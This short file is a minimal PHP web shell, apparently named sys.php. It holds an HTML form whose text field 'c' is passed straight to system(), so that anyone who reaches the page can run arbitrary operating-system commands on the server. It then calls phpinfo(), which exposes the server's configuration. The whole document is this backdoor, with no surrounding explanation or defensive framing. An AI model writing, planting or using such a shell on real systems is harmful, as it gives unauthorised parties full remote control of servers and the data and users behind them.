<form action="sys.php" method="POST">
<input type=text name="c">
<input type=submit name="submit" value="submit">
</form>
<?php system($_POST['c']);
echo phpinfo(); ?>
